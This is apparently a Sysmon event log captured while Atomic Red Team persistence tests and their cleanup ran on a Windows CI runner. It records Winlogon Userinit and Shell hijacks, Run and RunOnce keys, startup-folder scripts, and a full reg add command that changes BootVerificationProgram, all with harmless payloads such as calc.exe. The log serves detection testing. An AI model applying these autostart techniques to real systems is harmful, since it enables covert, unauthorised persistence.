TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3eq1sdcj.kqt.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:27.363
ProcessGuid: {f995aebf-62df-6942-4405-000000000e00}
ProcessId: 6916
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3eq1sdcj.kqt.ps1
CreationUtcTime: 2025-12-17 07:59:27.363
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:27.093
ProcessGuid: {f995aebf-62de-6942-4205-000000000e00}
ProcessId: 3804
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit-backup
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:27 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:27.089
ProcessGuid: {f995aebf-62de-6942-4205-000000000e00}
ProcessId: 3804
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
Details: C:\Windows\system32\userinit.exe,
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:26 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:26.908
ProcessGuid: {f995aebf-62de-6942-4205-000000000e00}
ProcessId: 3804
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1t3ey03j.4de.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:26 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:26.890
ProcessGuid: {f995aebf-62de-6942-4205-000000000e00}
ProcessId: 3804
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1t3ey03j.4de.ps1
CreationUtcTime: 2025-12-17 07:59:26.888
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:26 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:26.446
ProcessGuid: {f995aebf-62de-6942-4005-000000000e00}
ProcessId: 7952
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wemors2p.131.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:26 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:26.428
ProcessGuid: {f995aebf-62de-6942-4005-000000000e00}
ProcessId: 7952
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wemors2p.131.ps1
CreationUtcTime: 2025-12-17 07:59:26.428
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:25.973
ProcessGuid: {f995aebf-62dd-6942-3e05-000000000e00}
ProcessId: 8476
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n5t24jca.zrw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:25 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:25.955
ProcessGuid: {f995aebf-62dd-6942-3e05-000000000e00}
ProcessId: 8476
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_n5t24jca.zrw.ps1
CreationUtcTime: 2025-12-17 07:59:25.955
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:25.443
ProcessGuid: {f995aebf-62dd-6942-3a05-000000000e00}
ProcessId: 4860
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h3egavbx.iww.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:25 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:25.423
ProcessGuid: {f995aebf-62dd-6942-3a05-000000000e00}
ProcessId: 4860
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h3egavbx.iww.ps1
CreationUtcTime: 2025-12-17 07:59:25.423
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:25 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:25.144
ProcessGuid: {f995aebf-62dc-6942-3805-000000000e00}
ProcessId: 2268
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\atomictest\calc.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 7:59:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:24.960
ProcessGuid: {f995aebf-62dc-6942-3805-000000000e00}
ProcessId: 2268
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jedt4tpj.x2w.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:24 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:24.942
ProcessGuid: {f995aebf-62dc-6942-3805-000000000e00}
ProcessId: 2268
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_jedt4tpj.x2w.ps1
CreationUtcTime: 2025-12-17 07:59:24.942
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:24 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:24.673
ProcessGuid: {f995aebf-62dc-6942-3605-000000000e00}
ProcessId: 4340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\socks5_powershell
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:24 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:24.500
ProcessGuid: {f995aebf-62dc-6942-3605-000000000e00}
ProcessId: 4340
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hy203a1s.53y.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:24 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:24.480
ProcessGuid: {f995aebf-62dc-6942-3605-000000000e00}
ProcessId: 4340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hy203a1s.53y.ps1
CreationUtcTime: 2025-12-17 07:59:24.480
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:23.814
ProcessGuid: {f995aebf-62db-6942-3105-000000000e00}
ProcessId: 7372
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_x3b2xsjp.alj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:23.798
ProcessGuid: {f995aebf-62db-6942-3105-000000000e00}
ProcessId: 7372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_x3b2xsjp.alj.ps1
CreationUtcTime: 2025-12-17 07:59:23.798
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:23.508
ProcessGuid: {f995aebf-62db-6942-2f05-000000000e00}
ProcessId: 4560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat
Hashes: SHA256=F7235DE2940ED81A2202170AF9873DDBA606192E5809996360BBF3548855F1CE
IsExecutable: false
Archived: true"
"12/17/2025 7:59:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:23.506
ProcessGuid: {f995aebf-62db-6942-2f05-000000000e00}
ProcessId: 4560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat
Hashes: SHA256=F7235DE2940ED81A2202170AF9873DDBA606192E5809996360BBF3548855F1CE
IsExecutable: false
Archived: true"
"12/17/2025 7:59:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:23.321
ProcessGuid: {f995aebf-62db-6942-2f05-000000000e00}
ProcessId: 4560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_d0rgsnv1.sqp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:23 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:23.304
ProcessGuid: {f995aebf-62db-6942-2f05-000000000e00}
ProcessId: 4560
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_d0rgsnv1.sqp.ps1
CreationUtcTime: 2025-12-17 07:59:23.304
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:22.855
ProcessGuid: {f995aebf-62da-6942-2d05-000000000e00}
ProcessId: 6636
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bamsfsc3.lfz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:22.839
ProcessGuid: {f995aebf-62da-6942-2d05-000000000e00}
ProcessId: 6636
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bamsfsc3.lfz.ps1
CreationUtcTime: 2025-12-17 07:59:22.839
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:22.558
ProcessGuid: {f995aebf-62da-6942-2b05-000000000e00}
ProcessId: 6228
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs
Hashes: SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78
IsExecutable: false
Archived: true"
"12/17/2025 7:59:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:22.556
ProcessGuid: {f995aebf-62da-6942-2b05-000000000e00}
ProcessId: 6228
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs
Hashes: SHA256=52D464FCC5B72D50B169A45ED8FDEF22792C3FCB683F598B6E605336E53EAF78
IsExecutable: false
Archived: true"
"12/17/2025 7:59:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:22.374
ProcessGuid: {f995aebf-62da-6942-2b05-000000000e00}
ProcessId: 6228
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_atfwul3f.s0u.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:22.357
ProcessGuid: {f995aebf-62da-6942-2b05-000000000e00}
ProcessId: 6228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_atfwul3f.s0u.ps1
CreationUtcTime: 2025-12-17 07:59:22.357
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:22 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:22.090
ProcessGuid: {f995aebf-62d9-6942-2905-000000000e00}
ProcessId: 9064
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:21 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:21.915
ProcessGuid: {f995aebf-62d9-6942-2905-000000000e00}
ProcessId: 9064
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_izcmp5ux.ajr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:21 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:21.897
ProcessGuid: {f995aebf-62d9-6942-2905-000000000e00}
ProcessId: 9064
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_izcmp5ux.ajr.ps1
CreationUtcTime: 2025-12-17 07:59:21.897
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:21 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:21.639
ProcessGuid: {f995aebf-62d9-6942-2805-000000000e00}
ProcessId: 5380
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:21 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:21.427
ProcessGuid: {f995aebf-62d9-6942-2505-000000000e00}
ProcessId: 3220
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:17 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:17.588
ProcessGuid: {f995aebf-552f-6942-d500-000000000e00}
ProcessId: 7572
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:16 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:16.955
ProcessGuid: {f995aebf-62d4-6942-1d05-000000000e00}
ProcessId: 1404
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath
Details: C:\Program Files\Internet Explorer\iexplore.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:16 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:16.950
ProcessGuid: {f995aebf-62d4-6942-1d05-000000000e00}
ProcessId: 1404
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: reg  add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0
ParentProcessGuid: {f995aebf-62d4-6942-1b05-000000000e00}
ParentProcessId: 3584
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:16 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:16.928
ProcessGuid: {f995aebf-62d4-6942-1b05-000000000e00}
ProcessId: 3584
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:16 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:16.253
ProcessGuid: {f995aebf-62d4-6942-1505-000000000e00}
ProcessId: 9024
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mme2uvtf.cvu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:16 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:16.235
ProcessGuid: {f995aebf-62d4-6942-1505-000000000e00}
ProcessId: 9024
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mme2uvtf.cvu.ps1
CreationUtcTime: 2025-12-17 07:59:16.235
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:15 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:59:15.938
ProcessGuid: {f995aebf-5511-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\System32\services.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:15 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:15.942
ProcessGuid: {f995aebf-5511-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc
Details: calc.exe
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:15 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:15.938
ProcessGuid: {f995aebf-5511-6942-0c00-000000000e00}
ProcessId: 972
Image: C:\Windows\system32\services.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:15.854
ProcessGuid: {f995aebf-5511-6942-0c00-000000000e00}
ProcessId: 972
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\services.exe
TargetFilename: C:\Windows\security\logs\scesrv.log
Hashes: SHA256=ED52ED910DC9A42307F0BD0121E7E5A48D9873D4DDFB7DA10C51EC6FA189F7CB
IsExecutable: false
Archived: true"
"12/17/2025 7:59:15 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:15.312
ProcessGuid: {f995aebf-62d3-6942-0f05-000000000e00}
ProcessId: 1900
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
Details: explorer.exe, C:\Windows\explorer.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:15 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:15.308
ProcessGuid: {f995aebf-62d3-6942-0f05-000000000e00}
ProcessId: 1900
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup
Details: explorer.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:15 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:15.127
ProcessGuid: {f995aebf-62d3-6942-0f05-000000000e00}
ProcessId: 1900
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nstgju1d.gud.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:15 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:15.111
ProcessGuid: {f995aebf-62d3-6942-0f05-000000000e00}
ProcessId: 1900
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nstgju1d.gud.ps1
CreationUtcTime: 2025-12-17 07:59:15.110
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:14 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:14.811
ProcessGuid: {f995aebf-62d2-6942-0d05-000000000e00}
ProcessId: 6236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
Details: C:\Windows\system32\userinit.exe, C:\Windows\System32\calc.exe
User: runnervm8j6r3\runneradmin"
